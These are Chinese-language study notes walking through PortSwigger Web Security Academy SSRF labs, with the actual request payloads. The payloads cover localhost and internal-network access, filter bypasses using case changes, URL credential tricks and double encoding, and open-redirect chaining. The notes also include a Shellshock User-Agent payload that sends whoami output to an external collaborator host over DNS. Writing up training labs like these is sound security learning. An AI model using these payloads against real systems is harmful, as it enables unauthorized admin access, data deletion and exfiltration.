## 常见的 SSRF 攻击

### 针对服务器的 SSRF 攻击
实验：针对本地服务器的基本 SSRF
https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost

检查库存的请求为
POST /product/stock HTTP/2
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1

修改为
stockApi=http%3a//localhost/admin
响应为
```html
<div>
    <span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
</div>
```
修改为
stockApi=http%3a//localhost/admin/delete%3fusername%3dcarlos

或在浏览器中显示响应，点击删除按钮，虽然此时由于从客户端请求功能而被拒绝，复制请求url到stockApi进行SSRF攻击


### 针对其他后端系统的 SSRF 攻击

实验：针对另一个后端系统的基本 SSRF
https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system

检查库存的请求为
POST /product/stock HTTP/2
stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1

发送到攻击器，爆破地址
stockApi=http%3a//192.168.0.§1§%3a8080
响应中大多是500以及.1地址的400，而有一个地址响应404

使用此地址并添加/admin 到路径
stockApi=http%3a//192.168.0.45%3a8080/admin
响应为管理员面板
```html
<div>
    <span>carlos - </span>
    <a href="/http://192.168.0.45:8080/admin/delete?username=carlos">Delete</a>
</div>
```

修改为
stockApi=http%3a//192.168.0.45%3a8080/admin/delete%3fusername%3dcarlos

## 绕过常见的 SSRF 防御措施

### 基于黑名单的输入过滤器 SSRF
实验：基于黑名单的输入过滤的 SSRF
https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter

检查库存的请求为
POST /product/stock HTTP/2
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1


修改为
stockApi=http%3a//locaLhost/AdmIn
成功访问管理员面板
```html
<div>
    <span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
</div>
```

修改为
stockApi=http%3a//locaLhost/AdmIn/delete%3fusername%3dcarlos

### 基于白名单输入过滤器的 SSRF


https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter

检查库存的请求为
POST /product/stock HTTP/2
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1

修改为
http://stock.weliketoshop.net:fakepassword@localhost/admin#@stock.weliketoshop.net
编码为，服务器检查@后的字符串是否为接受域名，于是将 @localhost/admin# 双重url编码，作为fakepassword的一部分
http://stock.weliketoshop.net:fakepassword%2540%256c%256f%2563%2561%256c%2568%256f%2573%2574%252f%2561%2564%256d%2569%256e%2523@stock.weliketoshop.net
返回的主页中包含管理员面板，但未成功访问 /admin 页面

示例解决方案：
> http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
只需对 # 进行双重url编码，在 @stock.weliketoshop.net 后输入路径

### 通过开放重定向绕过 SSRF 过滤器

实验：通过开放重定向漏洞绕过过滤器实现 SSRF
https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection

对详情的请求为
GET /product?productId=1 HTTP/2
响应中的页面跳转按钮为
```html
<a href="/product/nextProduct?currentProductId=1&path=/product?productId=2">| Next product</a>
```

请求页面跳转
GET /product/nextProduct?currentProductId=1&path=/product?productId=2 HTTP/2
响应为
HTTP/2 302 Found
Location: /product?productId=2

修改url查询参数 path 的值，任意重定向漏洞
/product/nextProduct?path=http://192.168.0.12:8080/admin

若未添加 // 或 http:// 头部，则成为当前页面url的相对路径 
/product/192.168.0.12:8080/admin


查询库存的表单post为
POST /product/stock HTTP/2
stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1

修改查询为
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
根据响应，进一步修改查询
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos


## 盲注 SSRF 漏洞

实验：带带外检测的盲 SSRF
https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection

修改详情页面的头部为
Referer: https://lrgch2xnpgo1rxsfrt5wmrva41asyjm8.oastify.com
检测到带外通信



实验：利用 Shellshock 漏洞进行盲 SSRF 攻击
https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation

示例解决方案：
观察到在页面的 Referer 头部中的带外https请求包含 User-Agent 头部
设置 User-Agent 头部为
> () { :; }; /usr/bin/nslookup $(whoami).8oxzepuam3lookp2og2jjesx1o7fv7jw.oastify.com
设置 Referer 头部，并在攻击器设置地址爆破
http://192.168.0.$1$:8080

若设置 User-Agent 为协作服务器，则也可获得一次https带外通信
在 Referer 头部设置 Shellshock 无法触发带外，但可在 User-Agent 头部实现 Shellshock 带外

Shellshock载荷是由于服务器对头部的处理存在漏洞，
此lab中Referer的SSRF将User-Agent返回，于是设置Shellshock载荷到User-Agent。
若后端组件服务器存在 Shellshock 漏洞，则执行载荷，触发带外

漏洞产生机制，动态执行将头部作为环境变量传递到Bash
Bash允许通过环境变量定义函数，格式为函数名='() { 函数体; }'
() { :; }是合法的函数定义
定义函数后，有缺陷的Bash并未终止，而是继续执行后续命令